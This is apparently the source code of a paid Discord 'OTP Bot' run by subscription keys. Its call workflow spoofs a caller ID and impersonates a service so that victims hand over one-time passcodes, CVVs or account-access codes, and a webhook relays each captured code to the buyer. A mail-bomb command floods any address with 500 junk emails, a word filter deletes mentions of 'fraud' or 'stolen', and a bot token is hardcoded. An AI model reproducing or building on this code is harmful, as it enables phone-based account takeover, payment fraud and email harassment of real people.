const {
    Client,
    Intents,
    MessageActionRow
} = require('discord.js');
const client = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES]
});
const {
    MessageEmbed
} = require('discord.js');
const token = "MTEwODQ3NTA2ODEwNDg0NzQ0MA.G2LXds.t2SYXOuiN0f-xT9WXStUxOfywe7plqY1ddxu28"; // Bot token
const {
    Permissions
} = require('discord.js');
const ran = require('randomstring')
const fs = require('fs');
const nodemailer = require('nodemailer');
const express = require('express'),
    app = express(),
    bodyParser = require('body-parser');

app.use(bodyParser.urlencoded({
    extended: true
}));
const publicIp = require('public-ip');
const {
    path
} = require('express/lib/application');
const {
    pathToFileURL
} = require('url');
app.engine('html', require('ejs').renderFile);
app.set('view engine', 'html');
const keyHandler = require('./keyhandler.js');
const callHandler = require('./callHandler.js')
const {
    type
} = require('os');


const flaggedWords = [
    "card",
    "spoof",
    "cheat",
    "fraud",
    "steal",
    "theft",
    "stolen",
    "hack",
    "logs"
]

client.on("ready", () => {
    console.log(`Logged in as ${client.user.tag}!`)
    client.user.setActivity('#1 OTP Bot', {
        type: 'PLAYING'
    });
})

client.on("messageCreate", async (message) => {
    let keyLog = JSON.parse(fs.readFileSync("keys/redeemedKeys.json"))
    for (let i = 0; i < flaggedWords.length; i++) {
        if (message.content.toLowerCase().includes(flaggedWords[i]) && message.channel.id != "972760885556838420") {
            message.delete()
            break
        }
    }
    if (message.content.startsWith(".createKey")) {
        if (message.channelId == "972760885556838420") {
            if (message.member.roles.cache.some(r => r.name.toLowerCase().includes("admin"))) {
                let dayAm = message.content.split(" ")[1];
                let key = keyHandler.createKey(parseInt(dayAm))
                if (key.startsWith("key-")) {
                    const toRep = new MessageEmbed()
                        .setColor('#77ff90')
                        .setTitle(dayAm + " day key created!")
                        .setDescription("`" + key + "`")
                    await message.reply({
                        embeds: [toRep]
                    })
                    log("creations.log", "\n<@" + message.author.id + "> or " + message.author.tag + " created a " + dayAm + " day key. | " + key)
                } else {
                    const toRep = new MessageEmbed()
                        .setColor('#ff2e2e')
                        .setTitle("Error creating key")
                        .setDescription("`" + key + "`")
                    await message.reply({
                        embeds: [toRep]
                    })
                }
            } else {
                const toRep = new MessageEmbed()
                    .setColor('#ff2e2e')
                    .setTitle("Unable to create key")
                    .setDescription("You do not have the `Admin` role.")
                await message.reply({
                    embeds: [toRep]
                })
            }
        } else {
            const toRep = new MessageEmbed()
                .setColor('#ff2e2e')
                .setTitle("Unable to create key")
                .setDescription("You can only create keys in the <#972760885556838420> channel.")
            await message.reply({
                embeds: [toRep]
            })
        }
    } else if (message.content.startsWith(".redeem")) {
        let key = message.content.split(" ")[1];
        let rets = keyHandler.redeemKey(key, message);
        if (rets[0] == false) {
            const toRep = new MessageEmbed()
                .setColor('#ff2e2e')
                .setTitle("Error redeeming key")
                .setDescription("That key doesn't appear to be valid.")
            await message.reply({
                embeds: [toRep]
            })
        } else if (rets[0] == true) {
            const toRep = new MessageEmbed()
                .setColor('#77ff90')
                .setTitle("Key successfully redeemed")
                .setDescription("Your key was redeemed for " + rets[1] + " day(s) of access.")
            await message.reply({
                embeds: [toRep]
            })
        }
        for (let i = 0; i < flaggedWords.length; i++) {
            if (message.content.toLowerCase().includes(flaggedWords[i])) {
                message.delete()
                break
            }
        }
    } else if (message.content.startsWith(".checkTime")) {
        if (hasAccess(message)) {
            let leftOver = keyLog[message.author.id] - (Math.floor(Date.now() / 1000));
            let fullT = convertTime(leftOver)
            const toRep = new MessageEmbed()
                .setColor('#77ff90')
                .setTitle("Time Left")
                .setDescription("You have " + fullT + " left on your subscription.")
            await message.reply({
                embeds: [toRep]
            })
        } else {
            try {
                const toRep = new MessageEmbed()
                    .setColor('#ff2e2e')
                    .setTitle("Error checking time")
                    .setDescription("You currently have no active subscription.")
                await message.reply({
                    embeds: [toRep]
                })
            } catch (ex) {
                console.log("Error")
            }
        }
    } else if (message.content.startsWith(".call")) {
        if (message.member.roles.cache.some(r => r.name === "Bot Access")) {
            if (hasAccess(message)) {
                if (message.channel.name == message.author.id) {
                    const filter = m => m.author.id == message.author.id;
                    const collector = message.channel.createMessageCollector({
                        filter,
                        time: 60000,
                        max: 6
                    });
                    let i = 0;
                    const arrayOf = ["Which OTP would you like to get? The current modules are:\n`1. Payment` `2. CVV Capture` `3. Social Media/Email access`", "Please enter the phone number of the target", "`Please enter the name of the target`", "`Please enter the phone number you wish to set the Caller ID as.` \n`Examples:` <#944338058772361218>", "`Please enter the name of the service you are calling as`", "`Please enter the amount of digits in the OTP code`"]
                    const toRep = new MessageEmbed()
                        .setColor('#77ff90')
                        .setTitle(`Call Initiation Step ${i + 1}`)
                        .setDescription(arrayOf[i])
                    message.reply({
                        embeds: [toRep]
                    })
                    collector.on('collect', m => {
                        i++
                        if (i <= 5) {
                            const toRep = new MessageEmbed()
                                .setColor('#77ff90')
                                .setTitle(`Call Initiation Step ${i + 1}`)
                                .setDescription(arrayOf[i])
                            m.reply({
                                embeds: [toRep]
                            })
                        }
                    });
                    collector.on('end', collected => {
                        collected = Array.from(collected.values())
                        if (collected.length !== 6) {
                            const toRep = new MessageEmbed()
                                .setColor('#ff2e2e')
                                .setTitle("Call Initiation Failed")
                                .setDescription("`Only " + collected.length + " out of 6 fields were entered within 1 minute. Call attempt cancelled`")
                            message.reply({
                                embeds: [toRep]
                            })
                        } else {
                            let module = collected[0].content
                            let toCall = collected[1].content
                            let targetName = collected[2].content
                            let callAs = collected[3].content
                            let service = collected[4].content
                            let digits = collected[5].content
                            const toRep = new MessageEmbed()
                                .setColor('#77ff90')
                                .setTitle("Call Outgoing")
                                .setDescription("Attempting to call `" + toCall + "` as `" + callAs + "`.")
                            message.channel.send({
                                embeds: [toRep]
                            })
                            callHandler.makeCall(toCall, targetName, callAs, service, digits, message, module)
                        }
                    });
                } else {
                    const toRep = new MessageEmbed()
                        .setColor('#ff2e2e')
                        .setTitle("Incorrect Channel")
                        .setDescription("You need to use the command in the designated channel.")
                    await message.reply({
                        embeds: [toRep]
                    })
                }
            } else {
                try {
                    const toRep = new MessageEmbed()
                        .setColor('#ff2e2e')
                        .setTitle("Error making call")
                        .setDescription("You currently have no active subscription.")
                    await message.reply({
                        embeds: [toRep]
                    })
                } catch (ex) {
                    console.log("Error")
                }
            }
        }
    } else if (message.content.startsWith('.bomb')) {
        if (hasAccess(message)) {
            let args = message.content.split(" ");
            if (args.length >= 2) {
                let target = args[1].trimStart();
                const toRep = new MessageEmbed()
                    .setColor('#77ff90')
                    .setTitle("Mail Bomber")
                    .setDescription("Attempting to mail bomb `" + target + "` right now.")
                let newM = await message.reply({
                    embeds: [toRep]
                })
                for (let i = 0; i < 500; i++) {
                    var mailOptions = {
                        from: `${ran.generate({length: 16})} <sin416426@gmail.com>`,
                        to: target,
                        subject: ran.generate({
                            length: 1024
                        }),
                        html: ran.generate({
                            length: 2048
                        }) + "..."
                    }
                    await transporter.sendMail(mailOptions, function (error, info) {
                        if (!error) {
                            toRep.setDescription("Mailed `" + target + "` " + i + " times.")
                            newM.edit({
                                embeds: [toRep]
                            })
                        } else if (error.response) {
                            log("mailerrors.log", "\n" + error.response)
                        }
                    });
                }
            } else {
                const toRep = new MessageEmbed()
                    .setColor('#ff2e2e')
                    .setTitle("Error bombing email")
                    .setDescription("The arguments for this command are `.bomb name@mail.com`.")
                await message.reply({
                    embeds: [toRep]
                })
            }
        } else {
            try {
                const toRep = new MessageEmbed()
                    .setColor('#ff2e2e')
                    .setTitle("Error bombing email")
                    .setDescription("You currently have no active subscription.")
                await message.reply({
                    embeds: [toRep]
                })
            } catch (ex) {
                console.log("Error")
            }
        }
    } else if (message.content.startsWith(".help")) {
        const toRep = new MessageEmbed()
            .setColor('#77ff90')
            .setTitle("All Commands")
            .addField("Public", "`.redeem {key}`")
            .addField("Access", "`.call`\n`.bomb {email}`\n`.checkTime`")
            .addField("Admins", "`.createKey {days}`")
        await message.reply({
            embeds: [toRep]
        })
    }
})

client.on("messageUpdate", (oldMessage, newMessage) => {
    for (let i = 0; i < flaggedWords.length; i++) {
        if (newMessage.content.toLowerCase().includes(flaggedWords[i]) && newMessage.channel.id != "972760885556838420") {
            newMessage.delete()
            break
        }
    }
});

function ip() {
    publicIp.v4().then(ip => {
        console.log(`http://${ip}:80/`)
        return ip;
    })
}

function log(path, string) {
    fs.appendFileSync("logs/" + path, string, function (err) {
        if (err) throw (err);
    })
}

function hasAccess(message) {
    if (message) {
        let keyLog = JSON.parse(fs.readFileSync("keys/redeemedKeys.json"))
        if (keyLog[message.author.id] && keyLog[message.author.id] > (Math.floor(Date.now() / 1000))) {
            return true
        } else {
            message.guild.channels.cache.some(c => {
                if (c.name == message.author.id) {
                    c.delete();
                }
            })
            message.member.roles.remove("964183940007100527")
            return false
        }
    }
}

function convertTime(value) {
    const sec = parseInt(value, 10);
    let hours = Math.floor(sec / 3600);
    let minutes = Math.floor((sec - (hours * 3600)) / 60);
    let seconds = sec - (hours * 3600) - (minutes * 60);
    if (hours < 10) {
        hours = "0" + hours;
    }
    if (minutes < 10) {
        minutes = "0" + minutes;
    }
    if (seconds < 10) {
        seconds = "0" + seconds;
    }
    return hours + ' hours ' + minutes + ' minutes and ' + seconds + ' seconds';
}

app.get("/test", (request, response) => {
    response.render('/test', {
        title: 'Website'
    }, function (err, html) {
        response.send('<title>0x73</title><body style="font-family:helvetica">Made by <a href="https://discord.gg/NvnYb99Xza">aaronn#2491.</a></body>');
    })
})

app.post("/test", async (req, res) => {
    await req.body
    if (req.body.caller) {
        if (req.body.type) {
            let typeOf = req.body.type
            const channel = await client.channels.cache.find(ch => ch.name === req.body.caller);
            if (typeOf == "declined") {
                const toRep = new MessageEmbed()
                    .setColor('#ff2e2e')
                    .setTitle("Call Failed")
                    .setDescription("The call was declined by the target.")
                //.addField("Call Status", req.body.status || "NaN")
                await channel.send({
                    embeds: [toRep]
                })
            } else if (typeOf == "answered") {
                const toRep = new MessageEmbed()
                    .setColor('#77ff90')
                    .setTitle("Call Answered")
                    .setDescription("The call was answered by the target.")
                await channel.send({
                    embeds: [toRep]
                })
            } else if (typeOf == "success" && req.body.code) {
                const toRep = new MessageEmbed()
                    .setColor('#77ff90')
                    .setTitle("Code Obtained")
                    .setDescription("The OTP code was successfully obtained.")
                    .addField("OTP", req.body.code)
                await channel.send({
                    embeds: [toRep]
                })
               
            } else if (typeOf == "failed" || typeOf == "noInput") {
                const toRep = new MessageEmbed()
                    .setColor('#ff2e2e')
                    .setTitle("Code Unobtained")
                    .setDescription("The OTP code was not obtained from the target and the call has been declined.")
                await channel.send({
                    embeds: [toRep]
                })
            } else if (typeOf == "sendotp") {
                const toRep = new MessageEmbed()
                    .setColor('#77ff90')
                    .setTitle("Send OTP")
                    .setDescription("The target has fallen for the bait, now it's time to send the OTP to their SMS.")
                await channel.send({
                    embeds: [toRep]
                })
            } else if(typeOf == "invalid") {
                const toRep = new MessageEmbed()
                    .setColor('#ff2e2e')
                    .setTitle("Invalid OTP Capture")
                    .setDescription("The capture type `"+req.body.typeOf+"` is not a valid entry. Please enter either `1, 2 or 3`")
                await channel.send({
                    embeds: [toRep]
                })
            }
        }
    }
    res.sendStatus(200)
    res.end()
})

app.get("/", (request, response) => {
    response.render('/test', {
        title: 'Website'
    }, function (err, html) {
        response.send('<title>0x73</title><body style="font-family:helvetica">Made by <a href="https://discord.gg/NvnYb99Xza">aaronn#2491.</a></body>');
    })
})

client.login(token)
app.listen(80);